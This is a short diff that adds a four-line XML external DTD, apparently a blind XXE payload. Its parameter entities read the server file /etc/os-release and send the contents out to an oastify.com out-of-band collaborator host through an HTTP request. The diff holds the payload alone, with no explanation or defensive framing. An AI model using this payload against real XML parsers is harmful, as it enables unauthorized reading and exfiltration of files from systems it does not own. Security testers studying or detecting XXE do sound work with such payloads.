@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/os-release">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://dxevn800b7v3o6vy1ofgcqgpagg741upj.oastify.com/?x=%file;'>">
+%eval;
+%exfiltrate;
